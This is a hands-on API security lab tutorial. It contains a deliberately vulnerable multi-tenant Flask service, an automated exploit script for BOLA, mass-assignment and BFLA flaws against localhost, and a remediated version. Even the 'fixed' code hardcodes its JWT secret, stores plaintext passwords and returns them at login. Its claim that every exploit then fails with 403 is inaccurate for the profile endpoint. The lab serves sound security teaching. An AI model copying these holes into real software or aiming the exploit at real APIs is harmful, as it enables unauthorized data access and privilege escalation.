---
title: "06. Hands-On Vulnerability Lab"
description: "Self-contained hands-on Python/Flask microservice lab demonstrating BOLA, Mass Assignment, and BFLA vulnerabilities, an automated PoC exploit script, and production remediation code."
keywords: ["AppSec", "API Security Lab", "BOLA Lab", "Mass Assignment Lab", "BFLA Lab", "Python", "Flask", "Exploit PoC"]
---

# 06. Hands-On Vulnerability Lab

In this hands-on lab, you will audit, exploit, and secure a multi-tenant Python Flask API microservice. You will exploit **BOLA (Broken Object Level Authorization)**, **Mass Assignment (Broken Property Authorization)**, and **BFLA (Broken Function Level Authorization)** vulnerabilities using an automated Python exploit script, and then apply enterprise-grade defensive fixes.

---

## 🧪 Lab Architecture & Environment Setup

```
┌─────────────────────────────────────────────────────────────────────────────┐
│                            HANDS-ON LAB ARCHITECTURE                        │
├─────────────────────────────────────────────────────────────────────────────┤
│                                                                             │
│   ┌────────────────────┐   HTTP API Calls    ┌──────────────────────────┐   │
│   │ Exploit Script     │ ──────────────────► │ Flask Microservice API   │   │
│   │ (exploit_lab.py)   │                     │ (vulnerable / secure)    │   │
│   └────────────────────┘                     └────────────┬─────────────┘   │
│                                                           │                 │
│                                              ┌────────────┴─────────────┐   │
│                                              │ In-Memory DB & Tenants   │   │
│                                              │ • Tenant 1 (Alice)       │   │
│                                              │ • Tenant 2 (Bob)         │   │
│                                              └──────────────────────────┘   │
└─────────────────────────────────────────────────────────────────────────────┘
```

### Prerequisites

Install Python 3.9+ and the required dependencies:
```bash
pip install flask pyjwt requests
```

---

## Step 1: Vulnerable Flask Application (`vulnerable_api.py`)

Create `vulnerable_api.py`:

```python
# vulnerable_api.py
import jwt
import datetime
from flask import Flask, request, jsonify

app = Flask(__name__)
JWT_SECRET = "super-secret-key-12345"

# Simulated Multi-Tenant In-Memory Database
USERS = {
    "alice@tenant1.com": {
        "id": 101,
        "email": "alice@tenant1.com",
        "password": "password123",
        "role": "USER",
        "tenant_id": 1,
        "bio": "Alice from Tenant 1"
    },
    "bob@tenant2.com": {
        "id": 102,
        "email": "bob@tenant2.com",
        "password": "password123",
        "role": "USER",
        "tenant_id": 2,
        "bio": "Bob from Tenant 2"
    }
}

DOCUMENTS = {
    "doc_101": {
        "id": "doc_101",
        "tenant_id": 1,
        "owner_id": 101,
        "title": "Tenant 1 Confidential Financial Roadmap",
        "content": "CONFIDENTIAL: Q4 Financial Budget and M&A Strategy"
    },
    "doc_102": {
        "id": "doc_102",
        "tenant_id": 2,
        "owner_id": 102,
        "title": "Tenant 2 Public Specs",
        "content": "Public API Specification document for Tenant 2"
    }
}

# Helper: Decode JWT Token
def get_auth_user():
    auth_header = request.headers.get("Authorization")
    if not auth_header or not auth_header.startswith("Bearer "):
        return None
    token = auth_header.split(" ")[1]
    try:
        payload = jwt.decode(token, JWT_SECRET, algorithms=["HS256"])
        return payload
    except Exception:
        return None

# ENDPOINT 1: Authentication (Issues JWT)
@app.route('/api/v1/auth/login', methods=['POST'])
def login():
    data = request.get_json() or {}
    email = data.get("email")
    password = data.get("password")
    
    user = USERS.get(email)
    if not user or user["password"] != password:
        return jsonify({"error": "Invalid credentials"}), 401
        
    token = jwt.encode({
        "sub": user["id"],
        "email": user["email"],
        "role": user["role"],
        "tenant_id": user["tenant_id"],
        "exp": datetime.datetime.utcnow() + datetime.timedelta(hours=1)
    }, JWT_SECRET, algorithm="HS256")
    
    return jsonify({"token": token, "user": user})

# VULNERABLE ENDPOINT 2: BOLA (Broken Object Level Authorization)
@app.route('/api/v1/tenants/<int:tenant_id>/documents/<doc_id>', methods=['GET'])
def get_document(tenant_id, doc_id):
    claims = get_auth_user()
    if not claims:
        return jsonify({"error": "Unauthorized"}), 401
        
    # VULNERABLE: Does NOT verify if claims['tenant_id'] == tenant_id
    # or if claims['sub'] == doc['owner_id']!
    doc = DOCUMENTS.get(doc_id)
    if not doc:
        return jsonify({"error": "Document not found"}), 404
        
    return jsonify({"status": "success", "document": doc})

# VULNERABLE ENDPOINT 3: Mass Assignment (BOPLA)
@app.route('/api/v1/user/profile', methods=['PUT'])
def update_profile():
    claims = get_auth_user()
    if not claims:
        return jsonify({"error": "Unauthorized"}), 401
        
    user_email = claims.get("email")
    user = USERS.get(user_email)
    
    # VULNERABLE: Accepts incoming JSON dict and binds ALL fields directly!
    payload = request.get_json() or {}
    user.update(payload) # Attacker can inject "role": "ADMIN", "tenant_id": 1
    
    return jsonify({"message": "Profile updated successfully", "user": user})

# VULNERABLE ENDPOINT 4: BFLA (Broken Function Level Authorization)
@app.route('/api/v1/admin/audit-logs', methods=['GET'])
def get_audit_logs():
    claims = get_auth_user()
    if not claims:
        return jsonify({"error": "Unauthorized"}), 401
        
    # VULNERABLE: Only verifies token validity, but fails to check claims['role'] == 'ADMIN'!
    logs = [
        {"id": 1, "action": "DELETE_USER", "executor": "admin@system.local"},
        {"id": 2, "action": "EXPORT_DB", "executor": "admin@system.local"}
    ]
    return jsonify({"status": "success", "audit_logs": logs})

if __name__ == '__main__':
    print("[*] Starting Vulnerable API Server on port 5006...")
    app.run(host='127.0.0.1', port=5006, debug=False)
```

---

## Step 2: Automated Exploit Script (`exploit_lab.py`)

Create `exploit_lab.py` to automate the exploit chain against the vulnerable API:

```python
# exploit_lab.py
import requests

BASE_URL = "http://127.0.0.1:5006"

def run_exploits():
    print("==========================================================")
    print("     API SECURITY LAB — AUTOMATED POC EXPLOIT CHAIN      ")
    print("==========================================================")

    # 1. Login as Bob (Tenant 2 Low-Privilege User)
    print("\n[+] Step 1: Logging in as Bob (Tenant 2 Regular User)...")
    res = requests.post(f"{BASE_URL}/api/v1/auth/login", json={
        "email": "bob@tenant2.com",
        "password": "password123"
    })
    
    if res.status_code != 200:
        print("[-] Login failed. Ensure vulnerable_api.py is running on port 5006.")
        return

    bob_token = res.json()["token"]
    headers = {"Authorization": f"Bearer {bob_token}"}
    print(f"[+] Successfully authenticated Bob! Token: {bob_token[:30]}...")

    # 2. Exploit 1: BOLA (Accessing Alice's Confidential Document in Tenant 1)
    print("\n----------------------------------------------------------")
    print("EXPLOIT 1: Testing BOLA on /api/v1/tenants/1/documents/doc_101...")
    res_bola = requests.get(f"{BASE_URL}/api/v1/tenants/1/documents/doc_101", headers=headers)
    print(f"[*] Response Status Code: {res_bola.status_code}")
    print(f"[*] Response Body: {res_bola.text}")
    
    if res_bola.status_code == 200 and "CONFIDENTIAL: Q4 Financial" in res_bola.text:
        print("🚨 VULNERABILITY 1 CONFIRMED: BOLA Exploited! Bob accessed Tenant 1 Private Data!")
    else:
        print("[-] BOLA Exploit Failed (Endpoint may be secured).")

    # 3. Exploit 2: Mass Assignment (Elevating Role to ADMIN and Switching Tenant)
    print("\n----------------------------------------------------------")
    print("EXPLOIT 2: Testing Mass Assignment Privilege Escalation on /api/v1/user/profile...")
    exploit_payload = {
        "bio": "Hacked Bio",
        "role": "ADMIN",      # Mass Assignment injection field
        "tenant_id": 1       # Mass Assignment injection field
    }
    res_mass = requests.put(f"{BASE_URL}/api/v1/user/profile", json=exploit_payload, headers=headers)
    print(f"[*] Response Status Code: {res_mass.status_code}")
    print(f"[*] Response Body: {res_mass.text}")
    
    if res_mass.status_code == 200 and '"role":"ADMIN"' in res_mass.text.replace(" ", ""):
        print("🚨 VULNERABILITY 2 CONFIRMED: Mass Assignment Escalated Bob to ADMIN!")
    else:
        print("[-] Mass Assignment Exploit Failed.")

    # 4. Exploit 3: BFLA (Accessing Admin Audit Logs using regular user token)
    print("\n----------------------------------------------------------")
    print("EXPLOIT 3: Testing BFLA on /api/v1/admin/audit-logs...")
    res_bfla = requests.get(f"{BASE_URL}/api/v1/admin/audit-logs", headers=headers)
    print(f"[*] Response Status Code: {res_bfla.status_code}")
    print(f"[*] Response Body: {res_bfla.text}")

    if res_bfla.status_code == 200 and "DELETE_USER" in res_bfla.text:
        print("🚨 VULNERABILITY 3 CONFIRMED: BFLA Exploited! Regular User accessed Admin Logs!")
    else:
        print("[-] BFLA Exploit Failed.")

if __name__ == "__main__":
    run_exploits()
```

---

## Step 3: Enterprise Secure Fix (`secure_api.py`)

Create `secure_api.py` to fix all three vulnerabilities:

```python
# secure_api.py
import jwt
import datetime
from functools import wraps
from flask import Flask, request, jsonify

app = Flask(__name__)
JWT_SECRET = "super-secret-key-12345"

USERS = {
    "alice@tenant1.com": {
        "id": 101,
        "email": "alice@tenant1.com",
        "password": "password123",
        "role": "USER",
        "tenant_id": 1,
        "bio": "Alice from Tenant 1"
    },
    "bob@tenant2.com": {
        "id": 102,
        "email": "bob@tenant2.com",
        "password": "password123",
        "role": "USER",
        "tenant_id": 2,
        "bio": "Bob from Tenant 2"
    }
}

DOCUMENTS = {
    "doc_101": {
        "id": "doc_101",
        "tenant_id": 1,
        "owner_id": 101,
        "title": "Tenant 1 Confidential Financial Roadmap",
        "content": "CONFIDENTIAL: Q4 Financial Budget and M&A Strategy"
    },
    "doc_102": {
        "id": "doc_102",
        "tenant_id": 2,
        "owner_id": 102,
        "title": "Tenant 2 Public Specs",
        "content": "Public API Specification document for Tenant 2"
    }
}

# SECURE: JWT Authentication Middleware Decorator
def jwt_required_secure(f):
    @wraps(f)
    def decorated(*args, **kwargs):
        auth_header = request.headers.get("Authorization")
        if not auth_header or not auth_header.startswith("Bearer "):
            return jsonify({"error": "Missing or invalid authorization header"}), 401
        
        token = auth_header.split(" ")[1]
        try:
            claims = jwt.decode(token, JWT_SECRET, algorithms=["HS256"])
            request.user_claims = claims
        except Exception:
            return jsonify({"error": "Invalid or expired token"}), 401
            
        return f(*args, **kwargs)
    return decorated

# SECURE: BFLA Role Check Decorator
def require_role(required_role):
    def decorator(f):
        @wraps(f)
        def decorated(*args, **kwargs):
            claims = getattr(request, 'user_claims', {})
            if claims.get("role") != required_role:
                return jsonify({"error": f"Forbidden: Requires {required_role} role"}), 403
            return f(*args, **kwargs)
        return decorated
    return decorator

@app.route('/api/v1/auth/login', methods=['POST'])
def login():
    data = request.get_json() or {}
    email = data.get("email")
    password = data.get("password")
    
    user = USERS.get(email)
    if not user or user["password"] != password:
        return jsonify({"error": "Invalid credentials"}), 401
        
    token = jwt.encode({
        "sub": user["id"],
        "email": user["email"],
        "role": user["role"],
        "tenant_id": user["tenant_id"],
        "exp": datetime.datetime.utcnow() + datetime.timedelta(hours=1)
    }, JWT_SECRET, algorithm="HS256")
    
    return jsonify({"token": token, "user": user})

# SECURE ENDPOINT 2: BOLA Remediated with Tenant & User Ownership Validation
@app.route('/api/v1/tenants/<int:tenant_id>/documents/<doc_id>', methods=['GET'])
@jwt_required_secure
def get_document_secure(tenant_id, doc_id):
    claims = request.user_claims
    
    # 1. Check Tenant Isolation Boundary
    if claims.get("tenant_id") != tenant_id:
        return jsonify({"error": "Access Denied: Tenant boundary mismatch"}), 403

    doc = DOCUMENTS.get(doc_id)
    if not doc:
        return jsonify({"error": "Document not found"}), 404
        
    # 2. Check Object Ownership Boundary
    if doc["tenant_id"] != claims["tenant_id"] or doc["owner_id"] != claims["sub"]:
        return jsonify({"error": "Access Denied: Resource ownership check failed"}), 403

    return jsonify({"status": "success", "document": doc})

# SECURE ENDPOINT 3: Mass Assignment Remediated with Strict Field Allowlisting (DTO Pattern)
ALLOWED_UPDATE_FIELDS = {'bio', 'phone_number'}

@app.route('/api/v1/user/profile', methods=['PUT'])
@jwt_required_secure
def update_profile_secure():
    claims = request.user_claims
    user = USERS.get(claims.get("email"))
    payload = request.get_json() or {}
    
    # SECURE FIX: Iterate ONLY over explicit allowlist!
    for field in ALLOWED_UPDATE_FIELDS:
        if field in payload:
            user[field] = payload[field]

    return jsonify({"message": "Profile updated successfully", "user": user})

# SECURE ENDPOINT 4: BFLA Remediated with Role Authorization Decorator
@app.route('/api/v1/admin/audit-logs', methods=['GET'])
@jwt_required_secure
@require_role('ADMIN') # Requires ADMIN role!
def get_audit_logs_secure():
    logs = [
        {"id": 1, "action": "DELETE_USER", "executor": "admin@system.local"},
        {"id": 2, "action": "EXPORT_DB", "executor": "admin@system.local"}
    ]
    return jsonify({"status": "success", "audit_logs": logs})

if __name__ == '__main__':
    print("[*] Starting Secure API Server on port 5006...")
    app.run(host='127.0.0.1', port=5006, debug=False)
```

---

## 🏃 Execution Instructions

### 1. Run Vulnerable API & Execute Exploit
In Terminal 1:
```bash
python vulnerable_api.py
```

In Terminal 2:
```bash
python exploit_lab.py
```
*Expected Result:* All three exploits succeed with `🚨 VULNERABILITY CONFIRMED` outputs.

---

### 2. Run Secure API & Verify Defense
Stop Terminal 1 (`Ctrl+C`) and start the secure server:
```bash
python secure_api.py
```

In Terminal 2, re-run the exploit script:
```bash
python exploit_lab.py
```
*Expected Result:* All three exploits fail with `403 Forbidden` status codes!

---

*Next Chapter: [07. References & Testing Tools →](07-references.md)*
